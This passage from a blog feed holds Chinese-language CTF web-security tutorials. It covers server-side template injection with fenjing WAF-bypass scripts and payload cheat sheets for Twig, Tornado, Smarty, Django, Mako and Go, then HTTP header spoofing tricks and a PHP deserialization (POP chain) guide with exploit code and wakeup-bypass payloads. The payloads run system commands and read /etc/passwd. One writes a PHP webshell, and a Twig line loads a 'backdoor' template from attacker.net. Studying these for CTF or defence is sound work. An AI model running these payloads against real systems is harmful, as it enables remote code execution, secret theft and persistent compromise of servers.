class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;０&quot;</span>,<span class="string">&quot;１&quot;</span>,<span class="string">&quot;２&quot;</span>,<span class="string">&quot;３&quot;</span>,<span class="string">&quot;４&quot;</span>,<span class="string">&quot;５&quot;</span>,<span class="string">&quot;６&quot;</span>,<span class="string">&quot;７&quot;</span>,<span class="string">&quot;８&quot;</span>,<span class="string">&quot;９&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>waf 返回文本生成 shell</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://10.137.0.28:5000&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@functools.lru_cache(<span class="params"><span class="number">1000</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">payload: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    time.sleep(<span class="number">0.02</span>)  <span class="comment"># 防止请求发送过多</span></span><br><span class="line">    resp = requests.get(URL, timeout=<span class="number">10</span>, params=&#123;<span class="string">&quot;name&quot;</span>: payload&#125;)</span><br><span class="line">    waf_text = <span class="string">&quot;BAD&quot;</span>  <span class="comment"># 被waf返回文本</span></span><br><span class="line">    <span class="keyword">return</span> waf_text <span class="keyword">not</span> <span class="keyword">in</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;ls /&quot;</span></span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(waf, cmd)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>自行修改~</p><h2 id="Twig-PHP">Twig(PHP)</h2><ul><li><p>{{7*7}} = 49</p></li><li><p>${7*7} = ${7*7}</p></li><li><p>{{7*‘7’}} = 49</p></li><li><p>{{1/0}} = Error</p></li><li><p>{{foobar}} Nothing</p><pre><code>  #Get Info  {{_self}} #(Ref. to current application)  {{_self.env}}  {{dump(app)}}  {{app.request.server.all|join(',')}}  #File read  &quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@  #Exec code  {{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;whoami&quot;)}}  {{_self.env.registerUndefinedFilterCallback(&quot;system&quot;)}}{{_self.env.getFilter(&quot;id;uname -a;hostname&quot;)}}  {{['id']|filter('system')}}  {{['cat\x20/etc/passwd']|filter('system')}}  {{['cat$IFS/etc/passwd']|filter('system')}}  {{['id',&quot;&quot;]|sort('system')}}  #Hide warnings and errors for automatic exploitation  {{[&quot;error_reporting&quot;, &quot;0&quot;]|sort(&quot;ini_set&quot;)}}</code></pre></li></ul><h2 id="Tornado-render-python">Tornado render(python)</h2><ul><li><p>{{7*7}} = 49</p></li><li><p>${7*7} = ${7*7}</p></li><li><p>{{foobar}} = Error</p></li><li><p>{{7*‘7’}} = 7777777</p><pre><code>  {% import os %}{{ os.popen(&quot;whoami&quot;).read() }}  {{handler.settings}}</code></pre></li></ul><h2 id="smarty-PHP">smarty(PHP)</h2><pre><code>{$smarty.version}{if system('ls')}{/if}{self::getStreamVariable(&quot;file:///etc/passwd&quot;)}{function+name='rce(){};@eval($_POST[1]);function%0a%0a'}{/function}{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;,self::clearConfig())}{literal}alert('xss');{/literal}{if readfile('/flag')}{/if}</code></pre><h2 id="Django">Django</h2><pre><code>{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}</code></pre><h2 id="Mako-python">Mako(python)</h2><pre><code>&lt;%import osx=os.popen('id').read()%&gt;${x}</code></pre><h2 id="GoLang">GoLang</h2><p>在 Go 的模板引擎中，可以通过特定的有效负载来确认其使用情况：</p><ul><li><p>{{ . }}：显示数据结构输入。例如，如果具有 Password attribute 时， {{ .Password }} 可能会暴露它。</p></li><li><p>{{printf “%s” “ssti” }}：应显示字符串 “ssti”。</p></li><li><p>{{html “ssti”}}、 {{js “ssti”}}：这些有效负载应返回 “ssti” ，而不附加 “html” 或 “js”</p></li></ul><p>对于 Go 中通过 SSTI 的 RCE，可以调用对象方法。例如，如果提供的对象具有 System 方法执行命令，它可以被利用，例如 {{ .System “ls” }}。访问源代码通常是利用这一点所必需的，如给定的示例所示：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> Secret (test <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">    out, \_ := exec.Command(test).CombinedOutput()</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">几乎基于jinja2模版的ssti注入</summary>
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>常见的各种http要求以及对应的headers</title>
    <link href="https://blog.hatchet.top/posts/93fc8735.html"/>
    <id>https://blog.hatchet.top/posts/93fc8735.html</id>
    <published>2024-08-25T13:38:50.000Z</published>
    <updated>2024-11-21T13:58:08.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GET-传参">GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br><a href="http://xxx.com/?a=1&amp;b=2&amp;c%5B0%5D=3&amp;c%5B1%5D=4&amp;d%5B%5D=5">xxx.com/?a=1&amp;b=2&amp;c[0]=3&amp;c[1]=4&amp;d[]=5</a></p><h1 id="POST-传参">POST 传参</h1><p>把 GET 请求改为 POST, 如果用的 burp 可以用这个一键切<br><img src="/img/web/http/change_request.png" alt=""></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a=4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/web/http/change_request.png" alt=""></p><h1 id="PUT-等更多类型的传参">PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限">要求 ip 地址为 127.0.0.1 / 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理">要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-123’等-php-参数">$_SERVER[‘FLAG’]=='123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器">要求改 UA / 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址">要求你的邮件地址</h1><p>From: <a href="mailto:xxx@example.com">xxx@example.com</a></p><h1 id="要求来自-网址-origin">要求来自 网址 (origin)</h1><p>Referer: <a href="http://xxx.org">xxx.org</a></p><h1 id="要求改-Cookie">要求改 Cookie</h1><p>格式如 Cookie: user=admin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GET-传参&quot;&gt;GET 传参&lt;/h1&gt;
&lt;p&gt;传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0&lt;br&gt;
&lt;a href=&quot;http://xxx.com/?a=1&amp;amp;b=2&amp;amp;c%5B0%5D=3&amp;amp;c%5B1%5D=4&amp;amp;d</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.hatchet.top/categories/CTF/"/>
    
    
    <category term="web" scheme="https://blog.hatchet.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>php的pop链构造&amp;反序列化</title>
    <link href="https://blog.hatchet.top/posts/32daafef.html"/>
    <id>https://blog.hatchet.top/posts/32daafef.html</id>
    <published>2024-08-25T11:46:24.000Z</published>
    <updated>2024-11-21T14:49:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法">部分魔术方法触发方法</h1><pre><code>__wakeup() 使用 unserialize()时优先触发__sleep() 使用 serialize()时优先触发__construct() 创建对象时自动触发__destruct() 对象被销毁时自动触发__get() 用于从不可访问的属性读取数据 $this-&gt;known-&gt;unknown;__call() 在对象上下文中调用不可访问的方法时触发 $this-&gt;known-&gt;unknown();__callStatic() 在静态上下文中调用不可访问的方法时触发 static $known;$this-&gt;known-&gt;unknown();__set() 用于将数据写入不可访问的属性 $this-&gt;known-&gt;unknown='set';__toString() 把类当作字符串使用时触发 echo $this-&gt;known; die($this-&gt;known);__invoke() 当尝试以调用函数的方式调用一个对象时触发 $this-&gt;known();__isset() 在不可访问的属性上调用 isset()或 empty()触发__unset() 在不可访问的属性上使用 unset()时触发</code></pre><h1 id="不含绕过的链子构造">不含绕过的链子构造</h1><p>__wakeup(), __construct(), __destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#$this-&gt;known();  invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#$this-&gt;known-&gt;known;  get</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#危险函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们注意到 class web 下存在一种很危险的格式<br><strong>$eva1($this-&gt;interesting);</strong> 也就是在 $eva1=&quot;eval&quot;时，就能用 eval()了，所以它作为尾。<br>链子总结如下</p><pre><code>syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> syc;</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> lover;</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> web;</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造">需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量">private 和 protected 属性的变量</h2><p>PHP7.1后对private和protect不敏感，但之前的版本赋值时一定要注意<br>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>当你要对 private 和 protected 里的数赋值时，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b, 要写$this-&gt;b, 且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸">str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘hacker’, ‘SDPCSEC’, $parm); 因为替换后被替换的字符串前的数字不变，所以每替换一次可以多出一个可供构造的字符。<br>举例：比如我想构造 <code>&quot;;&#125;</code> ，<br>构造的字符串为：</p><pre><code>O:3:&quot;CTF&quot;:4:&#123;s:4:&quot;name&quot;:s:21:&quot;hackerhackerhacker&quot;;&#125;&quot;;&#125;</code></pre><p>经过替换后：</p><pre><code>O:3:&quot;CTF&quot;:4:&#123;s:4:&quot;name&quot;:s:21:&quot;SDPCSECSDPCSECSDPCSEC&quot;;&#125;&quot;;&#125;</code></pre><p>替换后被替换的字符串前的数字匹配成功，导致字符串可被构造逃逸、<br>一个参考的构造程序，$a 开头要加&quot;用于闭合。结尾要有; }用于结束反序列化。</p><h3 id="替换后字符变多">替换后字符变多</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="替换后字符变少">替换后字符变少</h3><p>（待更新）</p><h2 id="wakeup-绕过">wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）">增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过">C 开头绕过</h3><p>将 O 改成 C 就可以，但是弊端就是这个类中的对象都没有属性了，也就是不能命令执行<br>如果碰到需要命令执行就得多几步了，正好 ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><h2 id="正则匹配绕过">正则匹配绕过</h2><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘/username/’, $data)); 这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>如果此时的匹配为(preg_match(‘/O:[%d]’, $data)); 你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h2 id="throw-new-Exception-绕过-GC-回收">throw new Exception()绕过: GC 回收</h2><p>throw new Error()或throw new Exception()都属于非正常退出的情况，所以不会调用__destruct方法<br>具体绕过的参考文献<br><a href="https://blog.csdn.net/Jayjay___/article/details/132463913">https://blog.csdn.net/Jayjay___/article/details/132463913</a><br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484">https://blog.csdn.net/Jayjay___/article/details/130647484</a></p><h3 id="fast-destruct">fast-destruct</h3><p>正常 payload</p><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;&#125;</code></pre><h4 id="删除末尾花括号">删除末尾花括号</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;</code></pre><h4 id="改数字：把最后-i-后的数字减少-1">改数字：把最后 i 后的数字减少 1</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:0;s:4:&quot;1234&quot;;&#125;</code></pre><h3 id="php-issue-9618">php issue#9618</h3><p>版本条件：</p><ul><li>7.4.x - 7.4.30</li><li>8.0.x</li></ul><h4 id="属性值的长度不匹配">属性值的长度不匹配</h4><pre><code>//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;//外部类属性值长度异常 payload：//先外类__destruct()后内类__wakeup()O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:2:&quot;1&quot;;&#125;O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;12&quot;;&#125;</code></pre><h4 id="去掉内部类的分号">去掉内部类的分号</h4><p>注：</p><pre><code>这样内部类直接回收，外部类没事，可以直接不执行内部类的wakeup。外部类去掉分号同理。如果内部外部类的花括号紧贴，也可以在两个花括号中间加分号，可绕过内部类wakeup。//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N**;**&#125;s:3:&quot;end&quot;;s:1:&quot;1&quot;;&#125;//去掉了内部类的分号的 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N&#125;s:3:&quot;end&quot;;s:2:&quot;1&quot;;&#125;</code></pre><h3 id="利用null回收">利用null回收</h3><p><img src="/img/web/geek2024/GC%E5%9B%9E%E6%94%B6.png" alt=""><br>假设要序列化的类为$a：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$jay17</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:13:&quot; third string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><pre><code>把最后的 i:1换成i:0，提前销毁最终的链子为a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:13:&quot; third string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:0;N;&#125;</code></pre><h2 id="两变量哈希相等">两变量哈希相等</h2><h3 id="引用绕过">引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过">内置类绕过</h3><h4 id="Error（仅能用于-PHP7）">Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用">Exception(PHP5, PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span 